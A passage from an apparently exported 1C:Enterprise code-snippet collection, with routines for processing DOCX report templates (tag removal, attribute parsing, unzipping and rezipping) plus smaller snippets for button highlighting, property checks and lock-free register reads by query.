		// если начало тэга идет после конца или не нашли его, то уменьшаем кол-во тэгов
		Если цИндексКонцаТэга < ИндексНачалаТэга Или ИндексНачалаТэга = 0 Тогда
			цКоличествоТэгов = цКоличествоТэгов - 1;
			// определяем индекс для поиска
			цИскатьС = цИндексКонцаТэга + цДлинаЗакрывающегоТэга;
		Иначе // иначе увеличиваем
			цКоличествоТэгов = цКоличествоТэгов + 1;
			// определяем индекс для поиска
			цИскатьС = ИндексНачалаТэга + цДлинаОткрывающегоТэга;
		КонецЕсли;
	КонецЦикла;
	
	Возврат цИндексКонцаТэга + цДлинаЗакрывающегоТэга;
КонецФункции

// Удаление из текста всех тегов переданного типа
//
// Параметры
//  Текст - in, текст для обработки
//  ИмяТэга - in, имя типа тега
//
// Возвращаемое значение
//  Обработанный текст
//
Функция УдалитьТэги(Знач Текст, Знач ИмяТэга) Экспорт
	ИмяТэга = ""<"" + ИмяТэга;
	Рез = """";
	// ищем тег
	НачалоТега = Найти(Текст, ИмяТэга);
	Пока НачалоТега > 0 Цикл
		Рез = Рез + Лев(Текст, НачалоТега - 1);
		Текст = Сред(Текст, НайтиНачинаяС(Текст, "">"", НачалоТега) + 1);
		НачалоТега = Найти(Текст, ИмяТэга);
	КонецЦикла;
	Рез = Рез + Текст;
	
	Возврат Рез;
КонецФункции

// Удаление из текста части текста начиная с открывающего тега и заканчивая закрывающим тегом (считает, что одноименных тегов не может быть в содержимом)
//
// Параметры
//  Текст - строка - in, текст для обработки
//  ИмяТэга - строка - in, имя типа тега
//
// Возвращаемое значение
//  Обработанный текст
//
Функция УдалитьТэгиССодержимым(Знач Текст, Знач ИмяТэга) Экспорт
	ИмяЗакрывающегоТэга = ""</"" + ИмяТэга + "">"";
	ИмяТэга = ""<"" + ИмяТэга;
	ДлинаЗакрывающегоТэга = СтрДлина(ИмяЗакрывающегоТэга);
	Рез = """";
	// ищем тег
	НачалоТэга = Найти(Текст, ИмяТэга);
	Пока НачалоТэга > 0 Цикл
		Рез = Рез + Лев(Текст, НачалоТэга - 1);
		Текст = Сред(Текст, НайтиНачинаяС(Текст, ИмяЗакрывающегоТэга, НачалоТэга) + ДлинаЗакрывающегоТэга);
		НачалоТэга = Найти(Текст, ИмяТэга);
	КонецЦикла;
	Рез = Рез + Текст;
	
	Возврат Рез;
КонецФункции

// Получение значения атрибута WML тега 
//
// Параметры
//  ОпределениеАтрибутов - in, определение атрибутов WML тега
//	Атрибут - in, наименование атрибута
//  ИскатьС - in, позиция, с которой необходимо начинать поиск атрибутов
//  ИскатьПо - in, позиция, до которой необходимо выполнять поиск атрибутов
//
// Возвращаемое значение
//  Текст атрибута
//
Функция ПолучитьЗначениеАтрибутаWMLТега(Знач ОпределениеАтрибутов, Знач Атрибут, Знач ИскатьС = 0, Знач ИскатьПо = 0) Экспорт
	Рез = """";
	Если ИскатьС = 0 И ИскатьПо = 0 Тогда
		НачалоАтрибута = Найти(ОпределениеАтрибутов, Атрибут);
	ИначеЕсли ИскатьС > 0 И ИскатьПо = 0 Тогда
		НачалоАтрибута = НайтиНачинаяС(ОпределениеАтрибутов, Атрибут, ИскатьС);
	ИначеЕсли ИскатьПо > 0 Тогда
		НачалоАтрибута = НайтиНачинаяСПо(ОпределениеАтрибутов, Атрибут, ?(ИскатьС = 0, 1, ИскатьС), ИскатьПо);
	КонецЕсли;
	Если НачалоАтрибута > 0 Тогда
		НачалоАтрибута = НачалоАтрибута + СтрДлина(Атрибут);
		КонецАтрибута = НайтиНачинаяС(ОпределениеАтрибутов, """""""", НачалоАтрибута);
		Если КонецАтрибута > 0 Тогда
			Рез = Сред(ОпределениеАтрибутов, НачалоАтрибута, КонецАтрибута - НачалоАтрибута);
		КонецЕсли;
	КонецЕсли;
	
	Возврат Рез;
КонецФункции

// Нормализация пути для текущей операционной системы
//
// Параметры
//  Путь - in, путь в файловой системе
//
// Возвращаемое значение
//  Нормализованый путь в файловой системе
//
Функция НормализоватьПуть(Знач Путь) Экспорт
	РазделительПути = ПолучитьРазделительПути();
	Возврат СтрЗаменить(СтрЗаменить(Путь, ""/"", РазделительПути), ""\"", РазделительПути);
КонецФункции

// Добавление разделителя пути в конец пути
//
// Параметры
//  Путь - in, путь в файловой системе
//
// Возвращаемое значение
//  Путь с разделителем пути в конце
//
Функция ДобавитьРазделительПути(Знач Путь) Экспорт
	РазделительПути = ПолучитьРазделительПути();
	// проверяем и если надо добавляем слэш в конец пути
	Если Прав(Путь, 1) <> РазделительПути Тогда 
		Возврат Путь + РазделительПути;
	Иначе
		Возврат Путь;
	КонецЕсли;
КонецФункции

// Возвращает расширение файла
//
// Параметры
//  ИмяФайла – in, имя файла на диске
//
// Возвращаемое значение
//  Расширение файла, если расширение нет, то пустая строка.
//
Функция ПолучитьРасширениеФайла(Знач ИмяФайла) Экспорт
	Файл = Новый Файл(ИмяФайла);
	Возврат Файл.Расширение;
КонецФункции

// Разбиение полного имени файла на путь к файлу и имя файла
//
// Параметры
//  ПолноеИмяФайла – in, полное имя файла на диске
//  ИмяКаталога – оut, путь к каталогу файла на диске
//  ИмяФайла – оut, имя файла, без имени каталога
//
Процедура ПолучитьКаталогИИмяФайла(Знач ПолноеИмяФайла, ИмяКаталога, ИмяФайла) Экспорт
	Файл = Новый Файл(ПолноеИмяФайла);
	ИмяКаталога = Файл.Путь;
	ИмяФайла = Файл.Имя;
КонецПроцедуры

// Проверка, является ли переданное значение путем к файлу
// 
// Параметры
//  ПолноеИмяФайла – in, полное имя файла на диске
//
// Возвращаемое значение
//  Истина, если путь к файлу
//
Функция ЭтоПутьКФайлу(Шаблон) Экспорт
	Если ТипЗнч(Шаблон) = Тип(""Строка"") Тогда
		Файл = Новый Файл(Шаблон);
		Возврат Файл.Существует();
	КонецЕсли;
	
	Возврат Ложь;
КонецФункции

#КонецОбласти

#Область ФункцииРаботыСАтрибутамиСекций

// Разбирается строка атрибутов секции
//
// Параметры
//  СтрокаАтрибутов - in, строка, содержащая определение атрибутов секции
//
// Возвращаемое значение
//  Структура атрибутов секции, Ключ - имя атрибута, Значение - значение атрибута
//
Функция РазобратьАтрибутыСекции(СтрокаАтрибутов)
	Если Найти(СтрокаАтрибутов, ""^"") = 0 Тогда
		Возврат СтрокаАтрибутов;
	КонецЕсли;
	
	Рез = Новый Структура;
	СтрокаАтрибутов = СтрЗаменить(СтрокаАтрибутов, ""~"", Символы.ПС);
	Для Шаг = 1 По СтрЧислоСтрок(СтрокаАтрибутов) Цикл
		Атрибут = СтрПолучитьСтроку(СтрокаАтрибутов, Шаг);
		Если Найти(Атрибут, ""^"") > 0 Тогда
			Атрибут = СтрЗаменить(Атрибут, ""^"", Символы.ПС);
			Рез.Вставить(СтрПолучитьСтроку(Атрибут, 1), СтрПолучитьСтроку(Атрибут, 2));
		КонецЕсли;
	КонецЦикла;
	
	Возврат Рез;
КонецФункции

// Считывает атрибуты секций
//
// Параметры
//  ДанныеШаблона - структура содержащая данные считанные из файлов шаблона
//
// Возвращаемое значение
//  Соответствие с атрибутами секций, Ключ - идентификатор секции, Значение - структура атрибутов секции
//
Функция СчитатьАтрибутыСекций(ДанныеШаблона) Экспорт
	Рез = Новый Соответствие;
	НастройкиДокумента = Неопределено;
	Если ДанныеШаблона.Свойство(""НастройкиДокумента"", НастройкиДокумента) Тогда
		НачалоПеременной = Найти(НастройкиДокумента, ""<w:docVar "");
		Пока НачалоПеременной > 0 Цикл
			Идентификатор = """";
			// получаем определение переменной
			НачалоПеременной = НачалоПеременной + 10;
			КонецПеременной = НайтиНачинаяС(НастройкиДокумента, ""/>"", НачалоПеременной);
			ОпределениеАтрибутов = Сред(НастройкиДокумента, НачалоПеременной, КонецПеременной - НачалоПеременной);
			// получаем идентификатор
			Идентификатор = ПолучитьЗначениеАтрибутаWMLТега(ОпределениеАтрибутов, ""w:name="""""");
			Если Не ПустаяСтрока(Идентификатор) Тогда
				// получаем атрибуты
				Рез.Вставить(Идентификатор, РазобратьАтрибутыСекции(ПолучитьЗначениеАтрибутаWMLТега(ОпределениеАтрибутов, ""w:val="""""")));
			КонецЕсли;
			НачалоПеременной = НайтиНачинаяС(НастройкиДокумента, ""<w:docVar "", КонецПеременной + 2);
		КонецЦикла;
	КонецЕсли;
	
	Возврат Рез;
КонецФункции

// Получение значения атрибута секции
//
// Параметры
//  АтрибутыСекции - in, структура атрибутов секции
//  ИмяАтрибута - in, наименование атрибута
//  ЗначениеПриОтстутствии - in, значение, которое будет возвращено, если атрибут отсутствует
//
// Возвращаемое значение
//  Значение атрибута
//
Функция ПолучитЗначениеАтрибутаСекции(АтрибутыСекции, ИмяАтрибута, ЗначениеПриОтстутствии = """") Экспорт
	Рез = """";
	Если ЗначениеЗаполнено(АтрибутыСекции) И ТипЗнч(АтрибутыСекции) = Тип(""Структура"") И АтрибутыСекции.Свойство(ИмяАтрибута, Рез) Тогда
	    Возврат Рез;
	Иначе
		Возврат ЗначениеПриОтстутствии;
	КонецЕсли;
КонецФункции

// Формирует новый файл настроек по соответсвию атрибутов. В соответствии к этому моменту должны остаться только 
// переменные не являющиеся атрибутами секций, либо атрибуты секций, итерация, которых больше текущей.
//
// Параметры
//  ДанныеШаблона - in out, структура содержащая данные считанные из файлов шаблона
//
Процедура ПереформироватьФайлНастроекДокумента(ДанныеШаблона, ЗначенияАтрибутов) Экспорт
	Если ДанныеШаблона.Свойство(""НастройкиДокумента"") И ЗначениеЗаполнено(ДанныеШаблона.НастройкиДокумента) Тогда
		ДанныеШаблона.НастройкиДокумента = УдалитьТэгиССодержимым(ДанныеШаблона.НастройкиДокумента, ""w:docVars""); 
		Если ЗначенияАтрибутов.Количество() > 0 Тогда
			Рез = ""<w:docVars>"";
			Для Каждого Атрибуты Из ЗначенияАтрибутов Цикл
				СтрокаАтрибутов = """";
				Если ТипЗнч(Атрибуты.Значение) = Тип(""Структура"") Тогда
					Для Каждого Атрибут Из Атрибуты.Значение Цикл
						СтрокаАтрибутов = СтрокаАтрибутов + Атрибут.Ключ + ""^"" + Атрибут.Значение + ""~"";
					КонецЦикла;
					Если Прав(СтрокаАтрибутов, 1) = ""~"" Тогда
						СтрокаАтрибутов = Лев(СтрокаАтрибутов, СтрДлина(СтрокаАтрибутов) - 1);
					КонецЕсли;
					Рез = Рез + ""<w:docVar w:name="""""" + Атрибуты.Ключ + """""" w:val="""""" + СтрокаАтрибутов + """"""/>""
				ИначеЕсли ТипЗнч(Атрибуты.Значение) = Тип(""Строка"") Тогда
					Рез = Рез + ""<w:docVar w:name="""""" + Атрибуты.Ключ + """""" w:val="""""" + Атрибуты.Значение + """"""/>""
				КонецЕсли;
			КонецЦикла;
			Рез = Рез + ""</w:docVars></w:settings>"";
			ДанныеШаблона.НастройкиДокумента = СтрЗаменить(ДанныеШаблона.НастройкиДокумента, ""</w:settings>"", Рез);
		КонецЕсли;
	КонецЕсли;
КонецПроцедуры

#КонецОбласти

#Если Не ВебКлиент Тогда

#Область ФункцииИПроцедурыРаботыСФайлами

// Считать текст файла
//
// Параметры
//  ПутьКФайлу - in, путь к файлу
//
// Возвращаемое значение
//  Текст файла
//
Функция ПрочитатьТекстФайла(Знач ПутьКФайлу) Экспорт
	ПутьКФайлу = НормализоватьПуть(ПутьКФайлу);
	Файл = Новый Файл(ПутьКФайлу);
	Если Файл.Существует() Тогда
		ТекстовыйФайл = Новый ЧтениеТекста(ПутьКФайлу, КодировкаТекста.UTF8);
		ТекстФайла = ТекстовыйФайл.Прочитать();
		ТекстовыйФайл.Закрыть();
		
		Возврат ТекстФайла;
	Иначе
		Возврат Неопределено;
	КонецЕсли;
КонецФункции

// Записать текст в файл
//
// Параметры
//  ПутьКФайлу - in, путь к файлу
//  ТекстФайла - in, текст файла
//
Процедура ЗаписатьТекстФайла(Знач ПутьКФайлу, Знач ТекстФайла) Экспорт
	Если ЗначениеЗаполнено(ТекстФайла) Тогда
		ТекстовыйФайл = Новый ЗаписьТекста(НормализоватьПуть(ПутьКФайлу), КодировкаТекста.UTF8);
		ТекстовыйФайл.Записать(ТекстФайла);
		ТекстовыйФайл.Закрыть();
	КонецЕсли;
КонецПроцедуры

#КонецОбласти

#Область ФункцииПолученияТекстаШаблонаОтчета

// Считывает в массив содержимое файлов колонтитулов
//
// Параметры
//  НачалоПутиККолонтитулу - in, строка, начало пути к файлам колонтитулов
//
// Возвращаемое значение
//  Массив, содержащий тексты файлов колонтитулов
//
Функция СчитатьФайлыКолонтитулов(НачалоПутиККолонтитулу)
	Колонтитулы = Новый Массив;
	Шаг = 1;
	Пока Шаг > 0 Цикл
		ТекстКолонтитула = ПрочитатьТекстФайла(НачалоПутиККолонтитулу + Формат(Шаг, ""ЧГ="") + "".xml"");
		Если ЗначениеЗаполнено(ТекстКолонтитула) Тогда
			Колонтитулы.Добавить(ТекстКолонтитула);
			Шаг = Шаг + 1;
		Иначе
			Шаг = -1;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Колонтитулы;
КонецФункции

// Возвращает текст шаблона, в случае если шаблон хранится в макете отчета
//
// Параметры
//  ПутьКФайлуШаблона - in, путь к файлу шаблона
//
// Возвращаемое значение
//  Структура, содержащая данные о считанном шаблоне
//
Функция ПолучитьДанныеШаблонаИзФайла(ПутьКФайлуШаблона) Экспорт
	ДанныеШаблона = Новый Структура;
	ИмяВременнойПапки = НормализоватьПуть(КаталогВременныхФайлов() + Строка(Новый УникальныйИдентификатор));
	ДанныеШаблона.Вставить(""ИмяВременнойПапки"", ИмяВременнойПапки);
	// извлекаем содержимое архива
	Попытка
		ZipФайл = Новый ЧтениеZipФайла(ПутьКФайлуШаблона);
		ZipФайл.ИзвлечьВсе(ИмяВременнойПапки);
		ZipФайл.Закрыть();
	Исключение
		ВызватьИсключение ""Допустимы файлы только в формате WordML (.docx)!"" + Символы.ПС + КраткоеПредставлениеОшибки(ИнформацияОбОшибке());
	КонецПопытки;
	// читаем тело документа из файла document
	ДанныеШаблона.Вставить(""ТекстШаблона"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\document.xml""));
	// читаем свойства документа из файла settings
	ДанныеШаблона.Вставить(""НастройкиДокумента"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\settings.xml""));
	// читаем определение списков из файла numbering
	ДанныеШаблона.Вставить(""ОпределениеСписков"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\numbering.xml""));
	// читаем свойства документа из файла core
	ДанныеШаблона.Вставить(""СвойстваДокумента"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\docProps\core.xml""));
	// читаем стили документа из файла styles
	ДанныеШаблона.Вставить(""СтилиДокумента"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\styles.xml""));
	// читаем сноски документа из файла footnotes
	ДанныеШаблона.Вставить(""Сноски"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\footnotes.xml""));
	// читаем концевые сноски документа из файла endnotes
	ДанныеШаблона.Вставить(""КонцевыеСноски"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\endnotes.xml""));
	// читаем примечания из файла comments
	ДанныеШаблона.Вставить(""Примечания"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\comments.xml""));
	// читаем типы документа из файла [Content_Types]
	ДанныеШаблона.Вставить(""ТипыСодержимого"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\[Content_Types].xml""));
	// читаем связи из файла document.xml.rels
	ДанныеШаблона.Вставить(""СвязиДокумента"", ПрочитатьТекстФайла(ИмяВременнойПапки + ""\word\_rels\document.xml.rels""));
	// читаем файлы нижних колонтитулов footer1.xml, footer2.xml...
	ДанныеШаблона.Вставить(""НижниеКолонтитулы"", СчитатьФайлыКолонтитулов(ИмяВременнойПапки + ""\word\footer""));
	// читаем файлы верхних колонтитулов header1.xml, header2.xml...
	ДанныеШаблона.Вставить(""ВерхниеКолонтитулы"", СчитатьФайлыКолонтитулов(ИмяВременнойПапки + ""\word\header""));
	
	Возврат ДанныеШаблона;
КонецФункции

#КонецОбласти

#Область ПроцедурыИФункцииФормированияИтоговогоФайлаОтчета

// Записывает файлы колонтитулов на диск
//
// Параметры
//  НачалоПутиККолонтитулу - in, строка, начало пути к файлам колонтитулов
//  Колонтитулы - in, массив текстов файлов колонтитулов
//
Процедура ЗаписатьФайлыКолонтитулов(НачалоПутиККолонтитулу, Колонтитулы)
	Шаг = 1;
	Для Каждого Колонтитул Из Колонтитулы Цикл
		ЗаписатьТекстФайла(НачалоПутиККолонтитулу + Формат(Шаг, ""ЧГ="") + "".xml"", Колонтитул);
		Шаг = Шаг + 1;
	КонецЦикла;
КонецПроцедуры

// Формирует итоговый файл отчета и помещает в хранилище значений
//
// Параметры
//  ДанныеШаблона - структура, содержащая данные шаблона
//
// Возвращаемое значение
//  Адрес файла во временном хранилище
// 
Функция СформироватьИтоговыйФайлОтчета(ДанныеШаблона) Экспорт
	// записываем тело документа в файл document
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\document.xml"", ДанныеШаблона.ТекстШаблона);
	// записываем тело документа в файл settings
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\settings.xml"", ДанныеШаблона.НастройкиДокумента);
	// записываем тело документа в файл numbering
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\numbering.xml"", ДанныеШаблона.ОпределениеСписков);
	// записываем свойства документа в файл core
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\docProps\core.xml"", ДанныеШаблона.СвойстваДокумента);
	// записываем свойства документа в файл core
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\styles.xml"", ДанныеШаблона.СтилиДокумента);
	// записываем сноски документа в файл footnotes
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\footnotes.xml"", ДанныеШаблона.Сноски);
	// записываем концевые сноски документа в файл endnotes
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\endnotes.xml"", ДанныеШаблона.КонцевыеСноски);
	// записываем концевые сноски документа в файл comments
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\comments.xml"", ДанныеШаблона.Примечания);
	// записываем типы документа в файл [Content_Types]
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\[Content_Types].xml"", ДанныеШаблона.ТипыСодержимого);
	// записываем связи документа в файл document.xml.rels
	ЗаписатьТекстФайла(ДанныеШаблона.ИмяВременнойПапки + ""\word\_rels\document.xml.rels"", ДанныеШаблона.СвязиДокумента);
	// записываем файлы нижних колонтитулов footer1.xml, footer2.xml...
	ЗаписатьФайлыКолонтитулов(ДанныеШаблона.ИмяВременнойПапки + ""\word\footer"", ДанныеШаблона.НижниеКолонтитулы);
	// записываем файлы нижних колонтитулов header1.xml, header2.xml...
	ЗаписатьФайлыКолонтитулов(ДанныеШаблона.ИмяВременнойПапки + ""\word\header"", ДанныеШаблона.ВерхниеКолонтитулы);
	// архивируем
	ИмяВременногоФайла = ПолучитьИмяВременногоФайла();
	ZipФайл = Новый ЗаписьZipФайла(ИмяВременногоФайла);
	ZipФайл.Добавить(ДанныеШаблона.ИмяВременнойПапки + ""\*"", РежимСохраненияПутейZIP.СохранятьОтносительныеПути, РежимОбработкиПодкаталоговZIP.ОбрабатыватьРекурсивно);
	ZipФайл.Записать();
	// помещаем во временное хранилище
	АдресХранилища = ПоместитьВоВременноеХранилище(Новый ДвоичныеДанные(ИмяВременногоФайла), Новый УникальныйИдентификатор);
	// удаляем временный файл и временную папку
	УдалитьФайлы(ИмяВременногоФайла);
	УдалитьФайлы(ДанныеШаблона.ИмяВременнойПапки);
		
	Возврат АдресХранилища;
КонецФункции

#КонецОбласти

#КонецЕсли"}
}
}
},
{0,
{"Пометка кнопки через цветовыделение (как начальная страница УНФ)",0,0,"","//При нажатии кпопулины будут становиться словно помеченными, но через цвет
&НаКлиенте
Процедура ПриВыбореВидаБизнеса(ВыбранныйВидБизнеса)
	
	Если ЗначениеЗаполнено(ВыбранныйВидБизнеса) Тогда
		ИмяКнопки = ""ВидБизнеса"" + ВыбранныйВидБизнеса;
	Иначе
		ИмяКнопки = ""ВидБизнесаНеУказан"";
	КонецЕсли;
	
	ВидБизнесаУжеВыбран = Элементы[ИмяКнопки].ЦветФона = ОбщегоНазначенияКлиентПовтИсп.ЦветСтиля(""ФонУправляющегоПоля"");
	
	Если ВидБизнесаУжеВыбран Тогда
		НайденныйЭлемент = ВидыБизнеса.НайтиПоЗначению(ВыбранныйВидБизнеса);
		Если НайденныйЭлемент <> Неопределено Тогда
			ВидыБизнеса.Удалить(НайденныйЭлемент);
		КонецЕсли;
		Элементы[ИмяКнопки].ЦветФона = ОбщегоНазначенияКлиентПовтИсп.ЦветСтиля(""ЦветФонаКнопки"");
	Иначе
		ВидыБизнеса.Добавить(ВыбранныйВидБизнеса);
		Элементы[ИмяКнопки].ЦветФона = ОбщегоНазначенияКлиентПовтИсп.ЦветСтиля(""ФонУправляющегоПоля"");
	КонецЕсли;
	
КонецПроцедуры"}
},
{0,
{"Проверка и соединение 2 значений в строку с И",0,0,"","лПервоеИлиВторое 	= <?""Первое условие""> ИЛИ <?""Второе условие"">;

Если лПервоеИлиВторое Тогда
	лСтрокаДвухУсловий 	= ?(<?""Первое условие"">, ""Строка1"", """") + ?(<?""Первое условие""> И <?""Второе условие"">, "" и "", """") + ?(<?""Второе условие"">, ""Строка2"", """");
КонецЕсли; "}
},
{0,
{"ПеременнаяСодержитСвойство (Через Структуру и ЗаполнитьЗначенияСвойств)",0,0,"","Функция ПеременнаяСодержитСвойство(Переменная, ИмяСвойства)
	
	// Инициализируем структуру для теста 
	// с ключом (значение переменной ""ИмяСвойства"") 
	// и значением произвольного GUID'а
	GUIDПроверка = Новый УникальныйИдентификатор;
	СтруктураПроверка = Новый Структура;
	СтруктураПроверка.Вставить(ИмяСвойства, GUIDПроверка);
	
	// Заполняем созданную структуру из переданного 
	// значения переменной
	ЗаполнитьЗначенияСвойств(СтруктураПроверка, Переменная);
	
	// Если значение для свойства структуры осталось 
	// NULL, то искомое свойство не найдено, 
	// и наоборот.
	
	Если СтруктураПроверка[ИмяСвойства] = GUIDПроверка Тогда
		Возврат Ложь;
	Иначе
		Возврат Истина;
	КонецЕсли;
	
КонецФункции
Пример использования функции ниже.

Процедура ПроверитьСвойствоДокумента()
	
	РеквизитыДокумента = Метаданные.Документы.ТестовыйДокумент.Реквизиты;
	ИмяРеквизита = ""Комментарий"";
	
	Если ПеременнаяСодержитСвойство(РеквизитыДокумента, ИмяРеквизита) Тогда
		Сообщить(""Реквизит """""" + ИмяРеквизита + """""" найден!""); 
	Иначе
		Сообщить(""Реквизит """""" + ИмяРеквизита + """""" НЕ найден!"");
	КонецЕсли;	
	
КонецПроцедуры

ТИПОВОЕ:
ОбщегоНазначенияКлиентСервер.ЕстьРеквизитИлиСвойствоОбъекта(Объект, ИмяРеквизита) 

Функция ЕстьРеквизитИлиСвойствоОбъекта(Объект, ИмяРеквизита) Экспорт 

КлючУникальности = Новый УникальныйИдентификатор; 
СтруктураРеквизита = Новый Структура(ИмяРеквизита, КлючУникальности); 
ЗаполнитьЗначенияСвойств(СтруктураРеквизита, Объект); 

Возврат СтруктураРеквизита[ИмяРеквизита] <> КлючУникальности; 

КонецФункции"}
},
{0,
{"ПрочитатьНаборРегистраЗапросом (чтобы не было блокировок, если надо только прочитать, а не изменять)",0,0,"","Процедура ПрочитатьНаборРегистраЗапросом(НаборРегистра) Экспорт
     
    // Получаем имя типа регистра и имя его метаданных
    МетаданныеРегистра = НаборРегистра.Метаданные();   
    ВидОбъекта = Неопределено;
	ЭтоРегистрБухгалтерии = Ложь;
    Если ОбщегоНазначения.ЭтоРегистрНакопления(МетаданныеРегистра) Тогда
        ВидОбъекта = ""РегистрНакопления"";
    ИначеЕсли ОбщегоНазначения.ЭтоРегистрСведений(МетаданныеРегистра) Тогда
        ВидОбъекта = ""РегистрСведений"";
    ИначеЕсли ОбщегоНазначения.ЭтоРегистрБухгалтерии(МетаданныеРегистра) Тогда
        ВидОбъекта = ""РегистрБухгалтерии"";
		ЭтоРегистрБухгалтерии = Истина;
    ИначеЕсли ОбщегоНазначения.ЭтоРегистрРасчета(МетаданныеРегистра) Тогда
        ВидОбъекта = ""РегистрРасчета"";
    КонецЕсли;
     
    // Если переданный объект не является регистром, то чтение не выполняем
    Если ВидОбъекта = Неопределено Тогда
        Возврат;
    КонецЕсли;
     
    // Формируем текст запроса для получения записей регистра
    ЗапросДанныхРегистра = Новый Запрос;
	Если ЭтоРегистрБухгалтерии Тогда
	    ЗапросДанныхРегистра.Текст =
	        ""Выбрать * 
	        |   Из "" + ВидОбъекта + ""."" + МетаданныеРегистра.Имя + "".ДвиженияССубконто(, , {УсловияОтбора}, , )
	        |ГДЕ
	        | {УсловияОтбора}"";
	Иначе
	    ЗапросДанныхРегистра.Текст =
	        ""Выбрать * 
	        |   Из "" + ВидОбъекта + ""."" + МетаданныеРегистра.Имя + ""
	        |ГДЕ
	        | {УсловияОтбора}"";
	КонецЕсли;
    // Условия отбора регистра формируем отдельно по коллекции элементов
    // отбора переданного набора записей
    ТекстОтбора = """";
    Для Каждого ЭлОтбора Из НаборРегистра.Отбор Цикл
        ОбработатьУсловиеОтбора(ЭлОтбора, ЗапросДанныхРегистра, ТекстОтбора);          
    КонецЦикла;
    Если ЗапросДанныхРегистра.Параметры.Количество() > 0 Тогда
        ЗапросДанныхРегистра.Текст = СтрЗаменить(ЗапросДанныхРегистра.Текст, ""{УсловияОтбора}"", ТекстОтбора);
    Иначе
        ЗапросДанныхРегистра.Текст = СтрЗаменить(ЗапросДанныхРегистра.Текст, ""{УсловияОтбора}"", "" ИСТИНА "");       
    КонецЕсли;
     
    // Получаем результат запроса в виде выборки и заполняем
    // набор записей
    ВыборкаДанныхРегистра = ЗапросДанныхРегистра.Выполнить().Выбрать();
    НаборРегистра.Очистить();
	Если ЭтоРегистрБухгалтерии Тогда
		Пока ВыборкаДанныхРегистра.Следующий() Цикл
			// Заполняем таблицу движений
			НоваяЗапись = НаборРегистра.Добавить();
			ЗаполнитьЗначенияСвойств(НоваяЗапись, ВыборкаДанныхРегистра);
			// Заполняем таблицу субконто
			ЕстьПоляСубконто = Истина;
			НомерСубконто = 1;
			Пока ЕстьПоляСубконто Цикл
				ИмяПоляСубконтоКт = ""СубконтоКт""+Формат(НомерСубконто,""ЧГ=0"");
				ИмяПоляСубконтоДт = ""СубконтоДт""+Формат(НомерСубконто,""ЧГ=0"");
				ЕстьСубконтоКт = СодержитСвойство(ВыборкаДанныхРегистра, ИмяПоляСубконтоКт);
				ЕстьСубконтоДт = СодержитСвойство(ВыборкаДанныхРегистра, ИмяПоляСубконтоДт);
				Если ЕстьСубконтоДт ИЛИ ЕстьСубконтоКт Тогда
					Если ЕстьСубконтоДт Тогда
						ЗначениеСубконто = ВыборкаДанныхРегистра[ИмяПоляСубконтоДт];
						ВидСубконто = ВыборкаДанныхРегистра[""Вид""+ИмяПоляСубконтоДт];
						НоваяЗапись.СубконтоДт[ВидСубконто] = ЗначениеСубконто;	
					КонецЕсли;
					Если ЕстьСубконтоКт Тогда
						ЗначениеСубконто = ВыборкаДанныхРегистра[ИмяПоляСубконтоКт];
						ВидСубконто = ВыборкаДанныхРегистра[""Вид""+ИмяПоляСубконтоКт];
						НоваяЗапись.СубконтоКт[ВидСубконто] = ЗначениеСубконто;	
					КонецЕсли;
				Иначе
					ЕстьПоляСубконто = Ложь;	
				КонецЕсли;
				НомерСубконто = НомерСубконто + 1;
			КонецЦикла;			
		КонецЦикла;
	Иначе
   		Пока ВыборкаДанныхРегистра.Следующий() Цикл
	        НовСтр = НаборРегистра.Добавить();
	        ЗаполнитьЗначенияСвойств(НовСтр, ВыборкаДанныхРегистра);
		КонецЦикла;
	КонецЕсли;
     
КонецПроцедуры
 
// Формируем текст условия запроса с учетом элементов отбора регистра, а также
// устанавливаем все необходимые параметры запроса
//  Параметры:
//      ЭлОтбора - элемент обора из коллекции ""НаборЗаписейРегистра.Отбор""
//      ЗапросДанныхРегистра - объект типа ""Запрос"", с помощью которого будет 
//          выполнено получение данных записей регистра
//      ТекстОтбора - переменная, в которую будут записаны сформированные
//          условия запроса строкой
//
Функция ОбработатьУсловиеОтбора(ЭлОтбора, ЗапросДанныхРегистра, ТекстОтбора)
     
    ТекстОтбора = ?(ЗапросДанныхРегистра.Параметры.Количество() > 0, "" И "", """") +
        ТекстОтбора +
        ЭлОтбора.ПутьКДанным;
         
    УсловиеОтбора = "" = "";
    Если ЭлОтбора.ВидСравнения = ВидСравнения.Больше Тогда
        УсловиеОтбора = "" > (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.БольшеИлиРавно Тогда
        УсловиеОтбора = "" >= (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.ВИерархии Тогда
        УсловиеОтбора = "" В ИЕРАРХИИ (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
    ИначеЕсли ЭлОтбора.ВидСравнения = ВидСравнения.ВСписке Тогда
        УсловиеОтбора = "" В (&"" + ЭлОтбора.Имя + "")"";
        ЗапросДанныхРегистра.УстановитьПараметр(ЭлОтбора.Имя, ЭлОтбора.Значение);
